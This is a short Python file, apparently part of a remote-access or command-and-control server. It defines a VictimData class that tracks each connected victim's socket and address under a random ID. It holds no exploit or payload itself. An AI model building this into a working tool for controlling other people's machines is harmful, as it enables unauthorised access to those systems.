import random
from dataclasses import dataclass, field
import socket
from typing import ClassVar


@dataclass
class VictimData:
    victim_id: int = field(init=False)
    conn: socket.socket = field(repr=False)
    addr: tuple
    victim_ids: ClassVar[set] = field(repr=False, default=set())

    def __post_init__(self):
        self.victim_id = self.__generate_id()

    def __generate_id(self):
        victim_id = random.randint(100,999)
        if victim_id not in self.victim_ids:
            VictimData.victim_ids.add(victim_id)
            return victim_id
        else:
            VictimData.victim_ids.add(victim_id)
            return self.__generate_id()
